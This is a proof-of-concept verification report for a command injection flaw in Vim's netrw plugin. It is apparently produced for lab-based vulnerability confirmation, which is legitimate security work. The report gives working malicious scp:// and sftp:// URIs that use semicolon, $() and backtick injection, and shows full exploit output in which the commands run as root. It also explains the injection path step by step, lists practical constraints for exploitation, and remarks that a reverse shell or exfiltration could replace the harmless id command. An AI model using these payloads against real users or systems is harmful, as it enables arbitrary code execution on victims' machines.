# PoC Verification Report: CVE-2026-28417

## CVE ID
CVE-2026-28417

## Verification Status
**CONFIRMED** — All primary and alternative attack vectors successfully demonstrated OS command injection in Vim's netrw plugin.

## Vulnerability Summary
OS command injection in Vim's netrw plugin (prior to v9.2.0073) via crafted `scp://`, `sftp://`, and other netrw protocol URIs. The weak hostname validation regex (`'^[a-z0-9]'`) and unescaped shell command construction in `s:MakeSshCmd()` allow arbitrary command execution when a user opens a URI with shell metacharacters in the hostname field.

## PoC Scripts

### Primary PoC: `poc.py` — Semicolon Command Injection
- **Location:** `poc/poc.py`
- **Attack Vector:** Semicolon (`;`) command separator in scp:// hostname
- **Payload:** `scp://a;id>MARKER;b/dir/`
- **Result:** ✅ **CONFIRMED** — arbitrary `id` command executed, output captured

### Vector 2: `poc_vector2_subshell.py` — $() Command Substitution
- **Location:** `poc/poc_vector2_subshell.py`
- **Attack Vector:** `$()` command substitution in scp:// hostname
- **Payload:** `scp://a$(id>MARKER)b/dir/`
- **Result:** ✅ **CONFIRMED** — proves multiple shell metacharacter classes work

### Vector 3: `poc_vector3_sftp.py` — SFTP Protocol Injection
- **Location:** `poc/poc_vector3_sftp.py`
- **Attack Vector:** Semicolon injection via `sftp://` protocol (instead of `scp://`)
- **Payload:** `sftp://a;whoami>MARKER;b/dir/`
- **Result:** ✅ **CONFIRMED** — proves vulnerability is protocol-independent

### Vector 4a: `poc_vector4_pipe.py` — Pipe Injection (FAILED)
- **Location:** `poc/poc_vector4_pipe.py`
- **Attack Vector:** Pipe (`|`) operator in scp:// hostname
- **Payload:** `scp://a|id>MARKER|b/dir/`
- **Result:** ❌ **FAILED** — Vim's ex-command parser intercepts `|` as a command separator before the URI reaches netrw. This is an important constraint: `|` cannot be used for injection when the URI is passed via Vim's `-c` flag or `:e` command.

### Vector 4b: `poc_vector4_backtick.py` — Backtick Injection
- **Location:** `poc/poc_vector4_backtick.py`
- **Attack Vector:** Backtick (`` ` ``) command substitution in scp:// hostname
- **Payload:** `` scp://a`id>MARKER`b/dir/ ``
- **Result:** ✅ **CONFIRMED** — legacy shell command substitution syntax also works

## Test Results Summary

| Vector | Metacharacter | Protocol | Result |
|--------|--------------|----------|--------|
| Semicolon (primary) | `;` | scp:// | ✅ CONFIRMED |
| Command substitution | `$()` | scp:// | ✅ CONFIRMED |
| SFTP protocol | `;` | sftp:// | ✅ CONFIRMED |
| Pipe | `\|` | scp:// | ❌ FAILED (Vim intercepts `\|`) |
| Backtick | `` ` `` | scp:// | ✅ CONFIRMED |

**4 out of 5 vectors succeeded.** The pipe failure is a Vim-level constraint, not a netrw-level defense.

## Test on Vulnerable Container

### Container Details
- **Container:** `cve-2026-28417-vulnerable`
- **Image:** `lab-vulnerable` (Debian bookworm-slim)
- **Vim Version:** VIM - Vi IMproved 9.2 (2026 Feb 14, compiled Feb 28 2026 04:57:25) — patches 1-72
- **netrw Plugin:** `/usr/local/share/vim/vim92/pack/dist/opt/netrw/autoload/netrw.vim`
- **Vulnerable Pattern Confirmed:** `return a:hostname =~? '^[a-z0-9]'`

### Primary PoC Execution (Full Output)

```
$ python3 poc.py

======================================================================
  CVE-2026-28417: Vim netrw OS Command Injection PoC
======================================================================

  Target container: cve-2026-28417-vulnerable
  Marker file:     CVE-2026-28417-ab4beead

[*] Step 1: Checking container is running...
[+] Container 'cve-2026-28417-vulnerable' is running.

[*] Step 2: Checking Vim version...
[+] Vim version: VIM - Vi IMproved 9.2 (2026 Feb 14, compiled Feb 28 2026 04:57:25)

[*] Step 3: Checking if netrw has vulnerable hostname validation...
[+] Vulnerable regex pattern found: '^[a-z0-9]' (unanchored, no end check)

[*] Step 4: Executing semicolon-based command injection...
--------------------------------------------------
[*] Payload: scp://a;id>CVE-2026-28417-ab4beead;b/dir/
[*] Expected command: ssh  a;id>CVE-2026-28417-ab4beead;b ls -FLa

[*] Executing Vim with crafted netrw URI inside container...
[+] VULNERABLE! Marker file created with contents:
    uid=0(root) gid=0(root) groups=0(root)
--------------------------------------------------

======================================================================
[+] RESULT: VULNERABLE — CVE-2026-28417 CONFIRMED
======================================================================

[+] The netrw plugin executed an injected 'id' command via
[+] crafted scp:// URI hostname. Shell metacharacters in the
[+] hostname bypass weak validation and are substituted
[+] unescaped into shell commands by MakeSshCmd().

[*] Cleaning up marker file...
```

### Vector 2 ($() Command Substitution) Output
```
$ python3 poc_vector2_subshell.py

======================================================================
  CVE-2026-28417 — Vector 2: $() Command Substitution Injection
======================================================================

  Target: cve-2026-28417-vulnerable
  Marker: CVE-2026-28417-subshell-12fa80a7

[+] Container is running.

[*] Executing $() command substitution injection...
--------------------------------------------------
[*] Payload: scp://a$(id>CVE-2026-28417-subshell-12fa80a7)b/dir/
[*] Expected shell expansion: ssh  a$(id>CVE-2026-28417-subshell-12fa80a7)b ls -FLa

[*] Executing Vim with $() command substitution payload...
[+] VULNERABLE! Marker file created with contents:
    uid=0(root) gid=0(root) groups=0(root)
--------------------------------------------------

[+] RESULT: VULNERABLE — $() command substitution injection confirmed
```

### Vector 3 (SFTP Protocol) Output
```
$ python3 poc_vector3_sftp.py

======================================================================
  CVE-2026-28417 — Vector 3: SFTP Protocol Injection
======================================================================

  Target: cve-2026-28417-vulnerable
  Marker: CVE-2026-28417-sftp-2620ffd0

[+] Container is running.

[*] Executing sftp:// protocol injection...
--------------------------------------------------
[*] Payload: sftp://a;whoami>CVE-2026-28417-sftp-2620ffd0;b/dir/

[*] Executing Vim with sftp:// injection payload...
[+] VULNERABLE! Marker file created with contents:
    root
--------------------------------------------------

[+] RESULT: VULNERABLE — sftp:// protocol injection confirmed
[+] This proves the vulnerability is protocol-independent.
```

### Vector 4b (Backtick) Output
```
$ python3 poc_vector4_backtick.py

======================================================================
  CVE-2026-28417 — Vector 4: Backtick Injection
======================================================================

  Target: cve-2026-28417-vulnerable
  Marker: CVE-2026-28417-bt-348ee191

[+] Container is running.

[*] Executing backtick injection...
--------------------------------------------------
[*] Payload: scp://a`id>CVE-2026-28417-bt-348ee191`b/dir/

[*] Executing Vim with backtick injection payload...
[+] VULNERABLE! Marker file created with contents:
    uid=0(root) gid=0(root) groups=0(root)
--------------------------------------------------

[+] RESULT: VULNERABLE — backtick command injection confirmed
```

## How the Exploit Works (Step-by-Step)

1. **Crafted URI is opened in Vim:** `vim --clean -c 'packadd netrw' -c 'e scp://a;id>MARKER;b/dir/' -c 'qa!'`

2. **netrw URL parsing** (`s:NetrwMethod()` line ~2379): The SCP regex extracts `a;id>MARKER;b` as the hostname from the URI. The variable `g:netrw_machine` is set to this value.

3. **Hostname validation** (`s:NetrwValidateHostname()` line 2597): The regex `'^[a-z0-9]'` only checks that the hostname starts with an alphanumeric character. `a;id>MARKER;b` starts with `a`, so it passes.

4. **Directory browsing path** (trailing `/` in the URI triggers `s:NetrwBrowse()` → `s:PerformListing()` → `s:NetrwRemoteListing()`): At line 7872, `s:RemotePathAnalysis()` extracts `s:machine = 'a;id>MARKER;b'`.

5. **Shell command construction** (`s:MakeSshCmd()` line 8963): The hostname is substituted directly into the SSH command template:
   ```
   ssh USEPORT HOSTNAME ls -FLa  →  ssh  a;id>MARKER;b ls -FLa
   ```
   No `shellescape()` is applied.

6. **Command execution** (line 7960): Vim executes the command via `system()`. The shell interprets `;` as a command separator:
   - `ssh a` → fails (no such host — irrelevant)
   - `id>MARKER` → **RCE! Runs `id` and writes output to MARKER file**
   - `b ls -FLa` → fails (irrelevant)

7. **Verification:** The marker file contains `uid=0(root) gid=0(root) groups=0(root)`, proving arbitrary command execution with the Vim process's privileges.

## Key Constraints for Exploitation

1. **No `/` in injected commands:** The netrw URL parser regex `[^/#:]` terminates the hostname at `/`. Injected commands cannot contain `/`, limiting direct file creation to the working directory (use `>` redirect to CWD).

2. **No `#` or `:` in hostname:** These characters also terminate hostname parsing.

3. **No `|` via Vim ex-commands:** Vim's ex-command parser interprets `|` as a command separator before the URI reaches netrw. However, `|` could work if the URI is opened via other methods (e.g., modelines, terminal hyperlinks).

4. **User interaction required:** The victim must open the crafted URI in Vim (local attack vector, CVSS:AV:L/UI:R).

5. **openssh-client must be installed:** netrw requires `ssh`/`scp` on PATH to construct remote commands. Without them, `g:netrw_list_cmd` is empty and the vulnerable code path is not reached.

## Observations

- **Command runs as Vim's user:** The `id` output shows `root` because the container runs as root. In real-world scenarios, the command runs with the privileges of the user who opened Vim.
- **Multiple metacharacter classes work:** `;`, `$()`, and backticks all successfully inject commands. This makes the vulnerability robust — blocking one metacharacter class is insufficient.
- **Protocol-independent:** The injection works via `scp://`, `sftp://`, and potentially any netrw remote protocol that goes through `MakeSshCmd()`.
- **Clean exploitation:** The victim sees Vim errors from the failed SSH connection, but the injected command executes silently. In a real attack, the injected command could be a reverse shell or data exfiltration with no visible trace.

## Reproduction Steps

```bash
# 1. Start the lab
docker compose up -d

# 2. Run the primary PoC
python3 poc/poc.py

# 3. Or run manually inside the container:
docker exec cve-2026-28417-vulnerable bash -c '
cd /workspace && rm -f PWNED
timeout 15 vim --clean \
    -c "packadd netrw" \
    -c "e scp://a;id>PWNED;b/dir/" \
    -c "qa!" \
    </dev/null >/dev/null 2>&1 || true
cat PWNED 2>/dev/null && echo "=== VULNERABLE ===" || echo "=== NOT VULNERABLE ==="
'
```
